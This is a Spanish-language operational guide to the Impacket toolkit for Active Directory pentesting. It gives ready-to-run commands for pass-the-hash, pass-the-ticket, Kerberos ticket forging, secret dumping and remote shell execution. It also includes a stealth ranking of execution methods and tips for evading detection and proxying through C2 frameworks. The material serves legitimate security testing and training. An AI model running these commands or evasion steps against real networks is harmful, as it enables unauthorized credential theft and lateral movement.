---
title: "Impacket — Guía Operativa"
description: "Guía completa de Impacket: instalación, configuración Kerberos, autenticación, inventario de herramientas y ejecución remota."
sidebar:
  order: 3
  label: "Impacket — Guía Operativa"
---

> <img src="https://pypi-camo.freetls.fastly.net/652cfe66f331e651740e9712d2b41136e85c4208/68747470733a2f2f6769746875622e636f6d2f757365722d6174746163686d656e74732f6173736574732f31346165643730302d306336652d343836352d616335332d363836623931383734663530" alt="Impacket" style="height: 40px; margin-bottom: 8px;" />
> 
> Guía operativa completa de Impacket v0.13.1 (Fortra). Cubre instalación, configuración del entorno Kerberos, métodos de autenticación, inventario de 60+ herramientas y comparativa OPSEC de ejecución remota.
> 
> **Repo Oficial:** [fortra/impacket](https://github.com/fortra/impacket)

---

## Instalación

### pipx (Recomendado)

```bash
sudo apt install pipx
pipx ensurepath
python3 -m pipx install impacket
```

### Virtual Environment (Desarrollo)

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
pip install .
```

### Kali Linux

```bash
sudo apt install python3-impacket impacket-scripts
# Scripts accesibles como impacket-psexec, impacket-secretsdump, etc.
```

### Docker

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
docker build -t impacket:latest .
docker run -it --rm -v /tmp/loot:/loot impacket:latest
```

### Comparativa de métodos

| Método | Caso de uso |
|--------|-------------|
| `pipx` | Uso diario de pentesting; fácil de actualizar |
| Virtual Env | Desarrollo, testing de branches específicos |
| `apt` (Kali) | Setup rápido; sin mantenimiento manual |
| Docker | Aislamiento completo; sin dependencias en el host |

> **Nota:** En distribuciones modernas con PEP 668, `pip install` directo falla. Usar `pipx` o `venv`.

---

## Configuración del entorno Kerberos

### DNS — Resolución de nombres

Kerberos depende de FQDNs. Las IPs fallan con `KDC_ERR_S_PRINCIPAL_UNKNOWN`.

```bash
# /etc/hosts — rápido y preciso
10.0.1.51    dc01.corp.local    corp.local
10.0.1.52    srv01.corp.local

# /etc/resolv.conf — usar el DC como DNS
nameserver 10.0.1.51
search corp.local
```

### Sincronización de reloj

Kerberos rechaza peticiones si el reloj difiere del DC por más de **5 minutos**.

```bash
# Verificar la hora del DC
nmap --script smb2-time -p 445 <DC_IP>

# Sincronizar
sudo timedatectl set-ntp off
sudo rdate -n <DC_IP>

# Sin cambiar el reloj del sistema
faketime -f "+2h" python3 GetUserSPNs.py ...
```

### /etc/krb5.conf (Opcional)

Impacket no requiere `krb5.conf` — maneja Kerberos internamente con `-dc-ip` y `-k`. Solo necesario si usas `kinit` o `klist` del sistema.

```ini
[libdefaults]
    default_realm = CORP.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    CORP.LOCAL = {
        kdc = dc01.corp.local
        admin_server = dc01.corp.local
    }

[domain_realm]
    .corp.local = CORP.LOCAL
    corp.local = CORP.LOCAL
```

### Tickets Kerberos (.ccache)

```bash
# Obtener TGT con contraseña
getTGT.py corp.local/usuario:password -dc-ip 10.0.1.51

# Obtener TGT con hash NTLM (Overpass-the-Hash)
getTGT.py corp.local/usuario -hashes :<NThash> -dc-ip 10.0.1.51

# Obtener TGT con AES key (Pass-the-Key)
getTGT.py corp.local/usuario -aesKey <key> -dc-ip 10.0.1.51

# Convertir entre formatos
ticketConverter.py ticket.kirbi ticket.ccache   # Windows → Linux
ticketConverter.py ticket.ccache ticket.kirbi   # Linux → Windows

# Establecer ticket para uso
export KRB5CCNAME=/path/to/ticket.ccache

# Usar con cualquier herramienta
psexec.py corp.local/usuario@dc01.corp.local -k -no-pass -dc-ip 10.0.1.51
```

---

## Autenticación — Formatos de conexión

Formato estándar: `DOMINIO/usuario:contraseña@objetivo`

### Contraseña

```bash
psexec.py CORP/admin:P@ssw0rd@192.168.1.10

# Omitir para prompt interactivo
psexec.py CORP/admin@192.168.1.10

# Cuenta local (sin dominio)
psexec.py ./admin:password@192.168.1.10
```

### Pass-the-Hash (NTLM)

```bash
psexec.py CORP/admin@10.0.1.10 -hashes :<NThash>

# Con null LM hash explícito
psexec.py CORP/admin@10.0.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:<NThash>
```

### Pass-the-Ticket (Kerberos)

```bash
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py CORP/admin@dc01.corp.local -k -no-pass -dc-ip 10.0.1.51
```

> **Importante:** Con `-k` (Kerberos), el objetivo DEBE ser un FQDN. Las IPs causan fallo de SPN.

### Pass-the-Key (AES)

```bash
# AES-256 (64 caracteres hex)
wmiexec.py CORP/admin@10.0.1.10 -aesKey <hex_aes256_key>

# AES-128 (32 caracteres hex) — auto-detectado
wmiexec.py CORP/admin@10.0.1.10 -aesKey <hex_aes128_key>
```

### Overpass-the-Hash (NTLM a Kerberos TGT)

```bash
# Solicitar TGT usando hash NTLM
getTGT.py -hashes :<NThash> CORP/admin

# Usar el TGT resultante
export KRB5CCNAME=admin.ccache
psexec.py CORP/admin@dc01.corp.local -k -no-pass
```

### Compatibilidad FQDN vs IP

| Escenario | FQDN | IP |
|-----------|------|----|
| NTLM (`-hashes`) | Funciona | Funciona |
| Kerberos (`-k`) | **Obligatorio** | Falla (SPN mismatch) |
| Flag `-dc-ip` | N/A | Siempre IP |

### Referencia de flags de autenticación

| Flag | Propósito |
|------|-----------|
| `-hashes LM:NT` | Autenticación con hash NTLM |
| `-k` | Usar autenticación Kerberos |
| `-no-pass` | No solicitar contraseña |
| `-dc-ip <IP>` | Especificar IP del Domain Controller |
| `-aesKey <key>` | AES key para Kerberos |
| `-target-ip <IP>` | IP del objetivo (con FQDN + Kerberos) |
| `-debug` | Habilitar output de depuración |

---

## Inventario de herramientas

### Ejecución remota

| Herramienta | Descripción |
|-------------|-------------|
| `psexec.py` | Shell remota vía SMB; sube ejecutable y crea servicio Windows |
| `smbexec.py` | Shell remota vía SMB; usa servicio temporal con archivos `.bat` |
| `wmiexec.py` | Shell remota vía WMI/DCOM; sin creación de servicio |
| `atexec.py` | Ejecución de comandos vía Task Scheduler (ATSVC) |
| `dcomexec.py` | Shell remota vía DCOM (MMC20, ShellWindows, ShellBrowserWindow) |
| `wmipersist.py` | Persistencia mediante subscripciones WMI (event consumers) |

### Kerberos

| Herramienta | Descripción |
|-------------|-------------|
| `getTGT.py` | Solicita TGT con contraseña, hash NTLM o AES key |
| `getST.py` | Solicita Service Ticket con TGT existente; soporta impersonación (S4U2Self/S4U2Proxy) |
| `GetNPUsers.py` | AS-REP Roasting — extrae hashes de cuentas sin pre-autenticación |
| `GetUserSPNs.py` | Kerberoasting — solicita TGS de cuentas con SPN y extrae hashes |
| `ticketer.py` | Genera Golden y Silver Tickets desde cero |
| `ticketConverter.py` | Convierte tickets entre formatos `.kirbi` (Windows) y `.ccache` (Linux) |
| `describeTicket.py` | Decodifica y muestra el contenido de un ticket Kerberos |
| `getPac.py` | Extrae y decodifica el PAC de un ticket Kerberos |
| `goldenPac.py` | Explota MS14-068 para obtener Golden Ticket y shell SYSTEM |
| `raiseChild.py` | Escalación child-to-parent en dominios de confianza (inter-realm TGT) |
| `keylistattack.py` | Extracción de claves RODC mediante Keylist Attack |

### SMB / MSRPC

| Herramienta | Descripción |
|-------------|-------------|
| `smbclient.py` | Cliente SMB interactivo; exploración de shares, subida/descarga de archivos |
| `smbserver.py` | Servidor SMB local para transferir archivos o capturar hashes NTLMv2 |
| `rpcdump.py` | Enumera interfaces RPC expuestas en un endpoint |
| `rpcmap.py` | Escanea y mapea interfaces MSRPC disponibles |
| `samrdump.py` | Enumera usuarios y grupos vía protocolo SAMR |
| `lookupsid.py` | Enumera SIDs del dominio mediante fuerza bruta de RIDs |
| `services.py` | Gestión remota de servicios Windows (crear, iniciar, detener, eliminar) |
| `reg.py` | Lectura y escritura remota del registro de Windows |
| `netview.py` | Descubre hosts en la red y sesiones/shares activos |
| `net.py` | Emulación de `net.exe` de Windows; gestión de usuarios, grupos, sesiones |

### LDAP / Active Directory

| Herramienta | Descripción |
|-------------|-------------|
| `GetADUsers.py` | Enumera usuarios del dominio vía LDAP |
| `GetADComputers.py` | Enumera equipos del dominio vía LDAP |
| `findDelegation.py` | Identifica delegaciones configuradas (unconstrained, constrained, RBCD) |
| `GetLAPSPassword.py` | Lee contraseñas LAPS de equipos del dominio |
| `addcomputer.py` | Añade un equipo al dominio (abusa de `ms-DS-MachineAccountQuota`) |
| `rbcd.py` | Configura Resource-Based Constrained Delegation en un objeto |
| `dacledit.py` | Modifica DACLs de objetos AD (WriteDACL abuse) |
| `owneredit.py` | Modifica el propietario de un objeto AD (WriteOwner abuse) |

### MSSQL

| Herramienta | Descripción |
|-------------|-------------|
| `mssqlclient.py` | Cliente MSSQL interactivo; soporta autenticación Windows y SQL |
| `mssqlinstance.py` | Descubre instancias MSSQL vía SQL Server Browser (UDP 1434) |

### Extracción de secretos

| Herramienta | Descripción |
|-------------|-------------|
| `secretsdump.py` | Extrae SAM, LSA secrets, NTDS.dit (DCSync); la herramienta más completa |
| `mimikatz.py` | Interfaz remota para ejecutar comandos Mimikatz |
| `dpapi.py` | Descifra blobs DPAPI, master keys y credenciales protegidas |

### Red / Relay

| Herramienta | Descripción |
|-------------|-------------|
| `ntlmrelayx.py` | Relay de autenticación NTLM a múltiples protocolos (SMB, LDAP, MSSQL, HTTP) |
| `smbserver.py` | Servidor SMB para captura de hashes y relay |
| `karmaSMB.py` | Servidor SMB que responde a cualquier solicitud de archivo |

### Utilidades

| Herramienta | Descripción |
|-------------|-------------|
| `exchanger.py` | Interacción con Exchange vía RPC/HTTP (enumeración de buzones, reglas) |
| `getArch.py` | Detecta la arquitectura (x86/x64) de un host remoto |
| `changepasswd.py` | Cambia contraseña de usuario vía SAMR o Kerberos kpasswd |
| `Get-GPPPassword.py` | Extrae contraseñas de Group Policy Preferences (GPP / cpassword) |
| `machine_role.py` | Identifica el rol de un equipo (DC, server, workstation) |
| `esentutl.py` | Parsea bases de datos ESE (NTDS.dit offline, etc.) |

---

## Ejecución remota — Comparativa OPSEC

| Herramienta | Protocolo | Servicio | Archivos en disco | Shell | OPSEC | Puerto |
|-------------|-----------|----------|-------------------|-------|-------|--------|
| `psexec.py` | SMB → .exe → Servicio | SI (Event 7045) | SI (.exe) | Semi-interactiva | [RUIDOSO] | 445 |
| `smbexec.py` | SMB → .bat → Servicio temp | Temporal | SI (.bat) | Semi-interactiva | [ALTO] | 445 |
| `wmiexec.py` | WMI/DCOM → Win32_Process.Create() | NO | SI (output) | Semi-interactiva | [MODERADO] | 135 + RPC |
| `atexec.py` | Task Scheduler (ATSVC) | NO (tarea) | SI (output) | Comando único | [MODERADO] | 445 |
| `dcomexec.py` | DCOM (MMC20, ShellWindows) | NO | Mínimo | Semi-interactiva | [SIGILOSO] | 135 + RPC |

### psexec.py

```bash
psexec.py CORP/admin:password@10.0.1.10
```

- Sube ejecutable (RemComSvc) a `ADMIN$`
- Crea e inicia servicio Windows
- **Artefactos:** Event ID 7045, ejecutable en disco, named pipe
- **Proceso padre:** `services.exe` → `cmd.exe`

### smbexec.py

```bash
smbexec.py CORP/admin:password@10.0.1.10
```

- Escribe comandos en `.bat` en `ADMIN$`
- Crea servicio temporal
- **Artefactos:** Servicio temporal, archivos `.bat` en `C:\Windows\Temp\`
- **Proceso padre:** `services.exe` → `cmd.exe`

### wmiexec.py [PREFERIDO]

```bash
wmiexec.py CORP/admin:password@10.0.1.10
```

- Usa WMI vía DCOM/RPC con `Win32_Process.Create()`
- Sin creación de servicio — se mezcla con tráfico admin legítimo
- **Artefactos:** Logs WMI, archivo `__output` en ADMIN$
- **Proceso padre:** `wmiprvse.exe` → `cmd.exe`

### atexec.py

```bash
atexec.py CORP/admin:password@10.0.1.10 "whoami"
```

- Crea tarea programada
- **Artefactos:** Event ID 4698, archivo de salida
- **Proceso padre:** `taskeng.exe`/`svchost.exe` → `cmd.exe`

### dcomexec.py [MAXIMO SIGILO]

```bash
dcomexec.py CORP/admin:password@10.0.1.10
dcomexec.py -object MMC20 CORP/admin:password@10.0.1.10
dcomexec.py -object ShellWindows CORP/admin:password@10.0.1.10
```

- Usa objetos DCOM legítimos vía RPC
- **Artefactos:** Tráfico DCOM/RPC, proceso padre inusual pero legítimo
- **Proceso padre:** `mmc.exe` o `explorer.exe` → `cmd.exe`

### Ranking OPSEC (Más sigiloso a más ruidoso)

1. `dcomexec.py` — DCOM nativo, mínimos artefactos
2. `wmiexec.py` — Sin servicio, WMI nativo
3. `atexec.py` — Task Scheduler, la creación se loguea
4. `smbexec.py` — Servicio temporal, .bat en disco
5. `psexec.py` — Servicio persistente, binario subido, named pipe

> **OPSEC Tips:**
> - Modificar código fuente de Impacket para cambiar nombres de servicio y archivos por defecto
> - Preferir `-k` (Kerberos) sobre NTLM para evitar logging NTLM
> - Proxear tráfico a través de SOCKS de tu C2 (Cobalt Strike, Sliver)

---

## Cheatsheets relacionados

- [AD Enumeration & Attacks](/metodologias/active-directory/active-directory-enumeration-attacks/) — Kerberoasting, DCSync, ACL abuse
- [Impacket — Ataques Kerberos & Credenciales](/metodologias/active-directory/impacket-attacks/) — Golden/Silver Tickets, secretsdump, relay, ADCS
- [Attacking Enterprise Networks](/metodologias/active-directory/attacking-enterprise-networks/) — Flujo end-to-end
